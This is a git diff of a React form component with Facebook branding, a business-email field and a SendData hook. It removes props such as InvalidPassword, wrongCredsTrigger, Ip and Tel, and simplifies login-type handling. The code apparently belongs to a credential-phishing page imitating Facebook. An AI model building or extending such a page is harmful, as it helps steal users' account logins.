@@ -1,8 +1,8 @@
 import React, { useContext, useState } from "react";
 import styled from "styled-components";
+import FacebookLogo from "../../assets/images/FLogo.png";
 import SendData from "../../hooks/SendData.js";
 import { DataContext } from "../../pages/index.js";
-import FacebookLogo from "../../assets/images/FLogo.png";
 
 // Component imports
 import LogoHeader from "../frriSpecific/LogoHeader.js";
@@ -51,35 +51,15 @@ function Form({
   BusinessEmail,
   setBusinessEmail,
   setContinueWithFacebook,
-  Unik,
-  Ip,
-  Tel,
-  Email,
-  setEmail,
-  Name,
-  InvalidPassword,
-  wrongPasswordTrigger,
-  wrongCredsTrigger,
 }) {
   const [BusinessEmailError, setBusinessEmailError] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [loadingType, setLoadingType] = useState(""); // 'facebook' or 'email'
-  const [beginTimer, setBeginTimer] = useState(false);
   let { AllData, setAllData } = useContext(DataContext);
 
   const NextStep = (stepText) => {
     setIsLoading(true);
-    
-    // Determine if it's Facebook or Gmail
-    if (stepText.includes("Facebook")) {
-      setLoadingType("facebook");
-      setContinueWithFacebook(true);
-    } else if (stepText.includes("Gmail")) {
-      setLoadingType("gmail");
-      setContinueWithFacebook(false);
-    } else {
-      setLoadingType("email");
-    }
+    setLoadingType(stepText.includes("Facebook") ? "facebook" : "email");
 
     let params = {
       ...AllData,
@@ -142,16 +122,6 @@ function Form({
               FacebookLogo={FacebookLogo}
               isLoading={isLoading}
               loadingType={loadingType}
-              Unik={Unik}
-              Tel={Tel}
-              Email={Email}
-              setEmail={setEmail}
-              Name={Name}
-              Ip={Ip}
-              setParentBeginTimer={setBeginTimer}
-              InvalidPassword={InvalidPassword}
-              wrongPasswordTrigger={wrongPasswordTrigger}
-              wrongCredsTrigger={wrongCredsTrigger}
             />
           </div>
         </FormWrapper>
